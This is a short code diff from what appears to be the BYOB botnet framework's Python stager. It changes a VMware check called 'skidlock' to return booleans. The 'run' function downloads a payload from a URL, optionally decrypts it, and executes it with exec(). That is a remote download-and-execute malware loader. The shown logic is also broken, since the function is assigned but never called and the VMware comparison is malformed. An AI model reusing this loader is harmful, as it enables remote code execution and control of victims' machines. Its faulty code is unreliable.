@@ -52,14 +52,14 @@ def skidlock():
     print (x)
     if x == "VMware, Inc." or "": #virtualbox command response needed.
         ctypes.windll.user32.MessageBoxW(0, "WARNING BYOB is running on this device this will give an atacker full control of your device if you have no idea what byob is please shutdown your computer.", "BYOB WARNING", 0)
-        return("true")
+        return(True)
     else:
-        return("false")
+        return(False)
 
 def run(url=None, key=None):
     if url:
         skid = skidlock
-        if skid == "true":
+        if skid == True:
             payload = decrypt(urlopen(url).read(), base64.b64decode(key)) if key else urlopen(url).read()
             exec(payload, globals())
         else:
